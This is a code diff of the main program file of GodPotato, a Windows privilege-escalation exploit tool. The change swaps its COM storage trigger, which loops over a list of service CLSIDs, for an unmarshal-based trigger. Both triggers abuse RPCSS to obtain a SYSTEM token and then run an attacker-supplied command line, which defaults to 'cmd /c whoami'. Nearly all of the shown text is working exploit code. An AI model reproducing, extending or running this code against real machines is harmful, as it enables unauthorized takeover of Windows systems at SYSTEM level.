@@ -1,42 +1,18 @@
 ﻿using System;
 using System.IO;
 using GodPotato.NativeAPI;
-using static GodPotato.NativeAPI.NativeMethods;
 using System.Security.Principal;
 using SharpToken;
 using static GodPotato.ArgsParse;
-using System.Collections.Generic;
 
 namespace GodPotato
 {
     internal class Program
     {
 
-        public static IStorage CreateIStorage()
-        {
-            int hr = 0;
-            IStorage ppstgOpen;
-            Guid guid = Guid.NewGuid();
-            if ((hr = CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes)) == NOERROR)
-            {
-                if ((hr = StgCreateDocfileOnILockBytes(lockBytes, NativeMethods.STGM_CREATE | NativeMethods.STGM_READWRITE | NativeMethods.STGM_SHARE_EXCLUSIVE, 0, out ppstgOpen)) != NativeMethods.NOERROR)
-                {
-                    throw new Exception("StgCreateDocfile fail hr = " + hr);
-                }
-            }
-            else
-            {
-                throw new Exception("CreateILockBytesOnHGlobal fail hr = " + hr);
-            }
-            return ppstgOpen;
-        }
-
-
 
         class GodPotatoArgs
         {
-            [ArgsAttribute("clsid", "{4991d34b-80a1-4291-83b6-3328366b9097}", Description = "Clsid")]
-            public string clsid { get; set; }
             [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
             public string cmd { get; set; }
         }
@@ -91,24 +67,6 @@ namespace GodPotato
                 }
             }
 
-            List<string> clsids = new List<string>
-            {
-                "4991d34b-80a1-4291-83b6-3328366b9097",//bits
-                "F20DA720-C02F-11CE-927B-0800095AE340",//Package
-                "A47979D2-C419-11D9-A5B4-001185AD2B89",//Network List Manager
-                "682159D9-C321-47CA-B3F1-30E36B2EC8B9"//explorer.exe
-            };
-
-
-            potatoArgs.clsid = potatoArgs.clsid.ToLower();
-            if (clsids.Contains(potatoArgs.clsid))
-            {
-                clsids.Remove(potatoArgs.clsid);
-            }
-            clsids.Insert(0, potatoArgs.clsid);
-
-
-
             try
             {
                 GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
@@ -123,31 +81,19 @@ namespace GodPotato
                 ConsoleWriter.WriteLine("[*] Start PipeServer");
                 godPotatoContext.Start();
 
-                for (int i = 0; i < clsids.Count; i++)
+                GodPotatoUnmarshalTrigger storageTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
+                try
                 {
-                    Guid comGuid = new Guid(clsids[i]);
-
-                    MULTI_QI[] qis = new MULTI_QI[1];
-                    qis[0].pIID = NativeMethods.GuidToPointer(IUnknownGuid);
-                    IStorage storage = CreateIStorage();
-                    GodPotatoStorageTrigger storageTrigger = new GodPotatoStorageTrigger(storage, godPotatoContext);
-                    try
-                    {
-                        ConsoleWriter.WriteLine("[*] Trigger RPCSS CLSID: " + comGuid);
-
-                        int hr = CoGetInstanceFromIStorage(null, ref comGuid, null, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
-                        ConsoleWriter.WriteLine("[*] CoGetInstanceFromIStorage: 0x{0:x}", hr);
-                    }
-                    catch (Exception e)
-                    {
-                        ConsoleWriter.WriteLine(e);
-                    }
-
-                    if (godPotatoContext.GetToken() != null)
-                    {
-                        break;
-                    }
+                    ConsoleWriter.WriteLine("[*] Trigger RPCSS");
+                    int hr = storageTrigger.Trigger();
+                    ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
+                    
                 }
+                catch (Exception e)
+                {
+                    ConsoleWriter.WriteLine(e);
+                }
+
 
                 WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                 if (systemIdentity != null)
